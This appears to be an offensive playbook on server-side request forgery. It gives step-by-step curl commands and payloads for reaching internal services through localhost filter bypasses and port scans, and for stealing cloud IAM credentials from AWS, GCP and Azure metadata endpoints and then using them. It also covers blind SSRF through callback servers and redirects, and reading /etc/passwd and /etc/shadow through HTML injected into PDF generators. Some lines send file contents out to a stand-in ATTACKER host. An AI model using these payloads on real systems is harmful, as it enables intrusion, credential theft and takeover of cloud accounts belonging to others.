# Web – Server-Side Request Forgery (SSRF)

### Basic SSRF to Internal Services [added: 2026-04]
- **Tags:** #SSRF #InternalAccess #LocalhostBypass #PortScan #OWASPA10 #ServiceDiscovery #IPBypass #127001
- **Trigger:** Application fetches a URL or resource based on user-supplied input (URL parameter, webhook URL, image import, PDF generator, or any "fetch from URL" feature) and the response content or behavior varies based on the target
- **Prereq:** A parameter that causes the server to make an HTTP request to a user-supplied URL + ability to observe the response (directly or via timing/error differences)
- **Yields:** Access to internal services not reachable from the internet (admin panels, databases, internal APIs, Docker API), internal network mapping, port scanning from the server's perspective
- **Opsec:** Low
- **Context:** You find a URL fetch feature (profile picture from URL, link preview, webhook test, URL import). The server makes the request from its own network position, so you can reach internal services. Start by probing localhost and common internal ranges. Many apps block "127.0.0.1" literally but miss alternative representations.
- **Payload/Method:**
```bash
# Step 1: Identify the SSRF vector — any parameter that fetches a URL
curl -s "http://target/api/fetch?url=http://ATTACKER:8080/ssrf_test"
# Check your listener — if you get a hit, the server follows the URL

# Step 2: Probe localhost services via common bypasses
# Direct:
curl "http://target/api/fetch?url=http://127.0.0.1:80"
# Decimal notation:
curl "http://target/api/fetch?url=http://2130706433:80"          # 127.0.0.1 as decimal
# IPv6:
curl "http://target/api/fetch?url=http://[::1]:80"
curl "http://target/api/fetch?url=http://[0:0:0:0:0:ffff:127.0.0.1]:80"
# Octal:
curl "http://target/api/fetch?url=http://0177.0.0.1:80"
# Hex:
curl "http://target/api/fetch?url=http://0x7f000001:80"
# URL encoding:
curl "http://target/api/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31:80"
# DNS rebinding (point your domain at 127.0.0.1):
curl "http://target/api/fetch?url=http://localtest.me:80"
# Redirect bypass — host a 302 redirect on your server:
curl "http://target/api/fetch?url=http://ATTACKER/redirect?to=http://127.0.0.1:80"

# Step 3: Internal port scan via SSRF (bash loop)
for port in 21 22 25 80 443 3000 3306 5432 5000 6379 8000 8080 8443 9200 27017; do
  resp=$(curl -s -o /dev/null -w "%{http_code}:%{time_total}" "http://target/api/fetch?url=http://127.0.0.1:${port}")
  echo "Port ${port}: ${resp}"
done

# Step 4: Probe common internal ranges
for octet in $(seq 1 10); do
  curl -s -o /dev/null -w "10.0.0.${octet}: %{http_code}\n" \
    "http://target/api/fetch?url=http://10.0.0.${octet}:80"
done

# Step 5: Access internal admin panels
curl "http://target/api/fetch?url=http://127.0.0.1:8080/admin"
curl "http://target/api/fetch?url=http://127.0.0.1:9200/_cat/indices"   # Elasticsearch
curl "http://target/api/fetch?url=http://127.0.0.1:6379/info"           # Redis
```

### SSRF to Cloud Metadata [added: 2026-04]
- **Tags:** #SSRF #CloudMetadata #AWS #IMDS #GCP #Azure #DigitalOcean #IAMCredentials #OWASPA10 #CloudPivot #EC2
- **Trigger:** Application runs on a cloud provider (AWS/GCP/Azure) and has an SSRF vulnerability — the cloud metadata service at 169.254.169.254 is reachable from the server's network namespace
- **Prereq:** Confirmed SSRF vector + application running on a cloud VM/container (EC2, GCE, Azure VM) + metadata service accessible (IMDSv1 or IMDSv2 token obtainable through SSRF)
- **Yields:** Cloud IAM temporary credentials (access key, secret key, session token), instance identity, user-data scripts potentially containing secrets, and pivoting into the cloud account
- **Opsec:** Med
- **Context:** This is the highest-impact SSRF escalation path. Cloud metadata endpoints hand out temporary IAM credentials that let you interact with the cloud provider's APIs. AWS IMDSv1 is a simple GET; IMDSv2 requires a PUT to get a token first. GCP and Azure have their own header requirements. Always try metadata immediately when you confirm SSRF on a cloud-hosted target.
- **Payload/Method:**
```bash
# === AWS IMDSv1 (no token needed, just GET) ===
# List IAM role:
curl "http://target/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Get credentials for the role:
curl "http://target/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
# Returns: AccessKeyId, SecretAccessKey, Token
# Get user-data (often contains setup scripts with hardcoded secrets):
curl "http://target/api/fetch?url=http://169.254.169.254/latest/user-data"

# === AWS IMDSv2 (requires PUT with token header) ===
# If the SSRF lets you set method/headers (e.g., via CRLF injection or Gopher):
# Step 1: Get token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Step 2: Use token
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "X-aws-ec2-metadata-token: ${TOKEN}"
# Via Gopher protocol (if supported by the SSRF):
curl "http://target/api/fetch?url=gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600%0d%0a%0d%0a"

# === GCP Metadata ===
curl "http://target/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
# If header injection is not possible, try:
curl "http://target/api/fetch?url=http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"

# === Azure Metadata ===
curl "http://target/api/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"

# === DigitalOcean Metadata ===
curl "http://target/api/fetch?url=http://169.254.169.254/metadata/v1.json"

# === Use stolen AWS creds ===
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
```

### Blind SSRF via Webhook / URL Parameter [added: 2026-04]
- **Tags:** #SSRF #BlindSSRF #OOB #OutOfBand #BurpCollaborator #interactsh #Webhook #OWASPA10 #TimingAttack #DNSRebinding
- **Trigger:** Application makes a server-side request to a user-supplied URL but does not return the response body to you (webhook registration, URL validation, link preview that only shows a status, or async job processing)
- **Prereq:** A parameter causing the server to make an outbound request + an external callback listener (Burp Collaborator, interactsh, or controlled DNS/HTTP server) to confirm the request is made
- **Yields:** Confirmation that SSRF exists (even without seeing the response), DNS-based internal network enumeration, timing-based port scanning, and potential escalation to full SSRF via redirect chains
- **Opsec:** Low
- **Context:** Many SSRF vectors are blind — the app fetches a URL but shows a generic "success" or "invalid" message regardless. You detect the SSRF by pointing it at your callback server. Once confirmed, escalate by using timing differences (open port = fast response, closed = timeout) for internal scanning, or chain with a redirect to try accessing internal services.
- **Payload/Method:**
```bash
# Step 1: Set up OOB listener
interactsh-client -v    # Gives you: abc123.oast.fun
# Or use Burp Collaborator from Burp Suite Pro

# Step 2: Inject callback URL into every URL-accepting parameter
curl -X POST "http://target/api/webhooks" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://abc123.oast.fun/ssrf-test"}'

curl "http://target/check-url?url=http://abc123.oast.fun/ssrf-probe"

# Step 3: Confirm via DNS (even if HTTP is blocked outbound)
curl "http://target/api/fetch?url=http://ssrf-confirm.abc123.oast.fun"
# If you get a DNS hit but no HTTP hit — outbound HTTP is blocked but DNS resolves

# Step 4: Timing-based port scan (blind SSRF)
# Open port responds fast, closed port times out
for port in 22 80 443 3306 6379 8080; do
  start=$(date +%s%N)
  curl -s -o /dev/null -m 5 "http://target/api/fetch?url=http://127.0.0.1:${port}"
  end=$(date +%s%N)
  elapsed=$(( (end - start) / 1000000 ))
  echo "Port ${port}: ${elapsed}ms"
done

# Step 5: Redirect chain to escalate blind SSRF to accessing internal resources
# Host on your server (python):
cat > redirect.py << 'PYEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys
class R(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', sys.argv[1])  # e.g., http://169.254.169.254/latest/meta-data/
        self.end_headers()
HTTPServer(('0.0.0.0', 8080), R).serve_forever()
PYEOF
python3 redirect.py "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Then trigger SSRF to your redirect server:
curl "http://target/api/fetch?url=http://ATTACKER:8080/"

# Step 6: DNS rebinding for persistent internal access
# Use tools like rbndr.us or Singularity to create a domain that alternates
# between your IP (for the first DNS check) and 127.0.0.1 (for the actual fetch)
```

### SSRF via PDF Generation / HTML Injection [added: 2026-04]
- **Tags:** #SSRF #PDFGeneration #wkhtmltopdf #HeadlessChrome #HTMLInjection #FileRead #OWASPA10 #ReportGeneration #Puppeteer
- **Trigger:** Application generates PDFs from user-supplied content (invoice/report generators, HTML-to-PDF export, markdown renderers, or any feature that converts user HTML/CSS to a document) and uses a browser engine or wkhtmltopdf on the server side
- **Prereq:** An input field whose content is rendered into a PDF or image by a server-side HTML renderer (wkhtmltopdf, Puppeteer, Chrome headless, WeasyPrint) + the renderer processes embedded resources (iframes, images, CSS, JS)
- **Yields:** Local file read (file:// protocol), SSRF to internal services, cloud metadata extraction — all embedded in the rendered PDF output
- **Opsec:** Low
- **Context:** PDF generation endpoints are common in invoicing, reporting, and export features. When they use wkhtmltopdf or headless Chrome to render HTML, injected HTML tags are processed server-side. An `<iframe src="file:///etc/passwd">` in your input will read local files. An `<img src="http://169.254.169.254/...">` triggers SSRF. The results appear embedded in the generated PDF.
- **Payload/Method:**
```bash
# Step 1: Test basic HTML injection into PDF
# Inject into any field that appears in the generated PDF:
curl -X POST "http://target/api/generate-report" \
  -H "Content-Type: application/json" \
  -d '{"title": "<b>HTML Injection Test</b>", "content": "<h1>If this is bold/large, HTML renders</h1>"}' \
  -o test_report.pdf

# Step 2: Local file read via iframe (wkhtmltopdf)
curl -X POST "http://target/api/generate-report" \
  -H "Content-Type: application/json" \
  -d '{"content": "<iframe src=\"file:///etc/passwd\" width=\"1000\" height=\"1000\"></iframe>"}' \
  -o lfi_report.pdf

# Step 3: Local file read via embed/object tags
'<embed src="file:///etc/passwd" type="text/plain" width="1000" height="1000">'
'<object data="file:///etc/shadow" type="text/plain" width="1000" height="1000">'

# Step 4: SSRF to cloud metadata via img/link/css
'<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">'
'<link rel="stylesheet" href="http://169.254.169.254/latest/user-data">'
# CSS-based exfil:
'<style>@import url("http://ATTACKER:8080/exfil");</style>'

# Step 5: JavaScript-based file read (if JS is enabled in the renderer)
'<script>
  var x = new XMLHttpRequest();
  x.open("GET", "file:///etc/passwd", false);
  x.send();
  new Image().src = "http://ATTACKER:8080/exfil?data=" + btoa(x.responseText);
</script>'

# Step 6: Exfiltrate via external CSS (works even when JS is disabled)
# Host CSS on your server that contains @font-face with src pointing to internal URLs:
'<link rel="stylesheet" href="http://ATTACKER:8080/evil.css">'
# evil.css:
# @font-face { font-family: x; src: url("http://169.254.169.254/latest/meta-data/"); }

# Step 7: Identify the renderer for targeted payloads
# wkhtmltopdf user-agent: "Mozilla/5.0 ... wkhtmltopdf"
# Check via callback: inject <img src="http://ATTACKER:8080/identify"> and inspect UA
```
